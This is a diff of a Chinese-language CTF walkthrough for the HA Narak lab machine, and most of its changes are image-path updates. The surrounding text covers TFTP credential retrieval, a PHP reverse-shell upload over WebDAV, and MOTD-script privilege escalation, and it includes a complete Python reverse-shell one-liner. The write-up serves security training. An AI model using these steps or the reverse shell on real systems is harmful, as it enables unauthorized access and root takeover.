@@ -5,7 +5,7 @@
 * `nmap`进行全端口扫描
     
 
-![](media/2025-08-21-HA-Nurak-Walkthrough/103b6ce4-9996-4d8b-b467-fcd2d42c2370.png)
+![](assets/images/2025-08-21-HA-Nurak-Walkthrough/103b6ce4-9996-4d8b-b467-fcd2d42c2370.png)
 
 机器服务很简单，一个ssh一个web
 
@@ -13,13 +13,13 @@
 
 web主页没什么交互场景，点击`Do Not Click`按钮后会跳转`http://192.168.188.131/images/666.jpg?`，这里url路径后有一个`?`，可能需要Fuzz参数？
 
-![](media/2025-08-21-HA-Nurak-Walkthrough/b553c582-1af6-4d2d-af61-ab72a31fd57c.png)
+![](assets/images/2025-08-21-HA-Nurak-Walkthrough/b553c582-1af6-4d2d-af61-ab72a31fd57c.png)
 
 feroxbuster扫描得到`/webdav`目录，访问需要`digit`认证
 
 目录扫描增加`.txt`后缀，发现`tips.txt`
 
-![](media/2025-08-21-HA-Nurak-Walkthrough/72a98eaf-d79f-4b8c-8169-bffe8d879290.png)
+![](assets/images/2025-08-21-HA-Nurak-Walkthrough/72a98eaf-d79f-4b8c-8169-bffe8d879290.png)
 
 `/tips.txt`提示存在`creds.txt`，这么常见的文件名，工具怎么扫不到呢？
 
@@ -31,13 +31,13 @@ Hint to open the door of narak can be found in creds.txt.
 
 通过对`udp top 100`端口进行扫描，发现`69/udp`端口可能开放了`tftp`服务（简单文件传输协议）
 
-![](media/2025-08-21-HA-Nurak-Walkthrough/faeb6c2c-94d0-416d-a5a3-196264804668.png)
+![](assets/images/2025-08-21-HA-Nurak-Walkthrough/faeb6c2c-94d0-416d-a5a3-196264804668.png)
 
 `tftp`服务与`ftp`的区别精髓在于`tftp`服务无法列出目录文件，只能通过目录猜解，而我们以及通过`tips.txt`得到了`creds.txt`路径
 
 get下来发现内容为base64，解码得到`yamdoot:Swarg`
 
-![](media/2025-08-21-HA-Nurak-Walkthrough/414a18f4-472c-41fa-b8e3-51b5692e3e43.png)
+![](assets/images/2025-08-21-HA-Nurak-Walkthrough/414a18f4-472c-41fa-b8e3-51b5692e3e43.png)
 
 通过devtest测试得到可以上传`txt`、`html`、`php`并解析
 
@@ -63,29 +63,29 @@ EXEC    jsp     FAIL
 
 通过`cadaver`连接`webdav`可以进行文件的上传与下载，由于`digit`认证很复杂，直接`reverse_shell`比较方便
 
-![](media/2025-08-21-HA-Nurak-Walkthrough/2f3934e5-65f8-4b2e-92d8-00f6f3c5476e.png)
+![](assets/images/2025-08-21-HA-Nurak-Walkthrough/2f3934e5-65f8-4b2e-92d8-00f6f3c5476e.png)
 
 通过`pwncat-cs`建立监听，浏览器访问`/php-reverse-shell.php`接收到反弹`shell`
 
-![](media/2025-08-21-HA-Nurak-Walkthrough/e1e103e0-f312-4a7b-813c-2e10eaf12146.png)
+![](assets/images/2025-08-21-HA-Nurak-Walkthrough/e1e103e0-f312-4a7b-813c-2e10eaf12146.png)
 
 通过`pwncat-cs`上传`linpeas.sh`搜集一波信息
 
-![](media/2025-08-21-HA-Nurak-Walkthrough/4db2f534-b9bc-48b0-9d53-b105b484603f.png)
+![](assets/images/2025-08-21-HA-Nurak-Walkthrough/4db2f534-b9bc-48b0-9d53-b105b484603f.png)
 
 `linpeash`执行报错不知道什么原因，直接搜集suid二进制文件
 
 发现也没什么可以做提权的文件
 
-![](media/2025-08-21-HA-Nurak-Walkthrough/5415af0e-7151-4aa4-8471-8cbc2325315c.png)
+![](assets/images/2025-08-21-HA-Nurak-Walkthrough/5415af0e-7151-4aa4-8471-8cbc2325315c.png)
 
 在搜集一波具有`rwx`权限的文件 发现存在/mnt/hell.sh
 
-![](media/2025-08-21-HA-Nurak-Walkthrough/400911d0-5607-4a65-9ba2-bdc0ad27838a.png)
+![](assets/images/2025-08-21-HA-Nurak-Walkthrough/400911d0-5607-4a65-9ba2-bdc0ad27838a.png)
 
 文件内容输出了一段字符 然后包含一段看着像`jsfuck`的编码 但测试无果 后经过测试为`brainfuck`编码
 
-![](media/2025-08-21-HA-Nurak-Walkthrough/b1cba361-8d70-42f0-97c3-08e05026417b.png)
+![](assets/images/2025-08-21-HA-Nurak-Walkthrough/b1cba361-8d70-42f0-97c3-08e05026417b.png)
 
 # shell as inferno
 
@@ -93,7 +93,7 @@ EXEC    jsp     FAIL
 
 发现在`/home/inferno/`下存在`user.txt`，代表目前得到了普通用户的flag，尝试使用解密得到的字符登录`inferno`用户，密码正确，那么可以直接ssh连接
 
-![](media/2025-08-21-HA-Nurak-Walkthrough/9f2f1baa-08e9-4ba5-a5fd-b659c58bb05b.png)
+![](assets/images/2025-08-21-HA-Nurak-Walkthrough/9f2f1baa-08e9-4ba5-a5fd-b659c58bb05b.png)
 
 # shell as root
 
@@ -103,13 +103,13 @@ EXEC    jsp     FAIL
 
 查找到的文件除了刚刚得到`inferno`用户密码的`/mnt/shell.sh`以外，均属于`motd`文件
 
-![](media/2025-08-21-HA-Nurak-Walkthrough/60c6b24f-9745-4d0b-9594-088850e24b64.png)
+![](assets/images/2025-08-21-HA-Nurak-Walkthrough/60c6b24f-9745-4d0b-9594-088850e24b64.png)
 
 ## MOTD提权
 
 > MOTD是`message of the day`的缩写，用作在ssh用户登陆时提示欢迎信息（basic info、last login等）
 
-![](media/2025-08-21-HA-Nurak-Walkthrough/7301a3da-16b1-4c08-b606-fac59f5e58c8.png)
+![](assets/images/2025-08-21-HA-Nurak-Walkthrough/7301a3da-16b1-4c08-b606-fac59f5e58c8.png)
 
 而这些提示信息的生成需要命令的执行，而实现它们的脚本就存放在`/etc/update-motd.d/`目录下
 
@@ -123,7 +123,7 @@ EXEC    jsp     FAIL
     export RHOST="192.168.188.128";export RPORT=8888;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
     ```
     
-    ![](media/2025-08-21-HA-Nurak-Walkthrough/18382a71-2660-4381-b712-b85236d82606.png)
+    ![](assets/images/2025-08-21-HA-Nurak-Walkthrough/18382a71-2660-4381-b712-b85236d82606.png)
     
 * 直接修改root密码
     
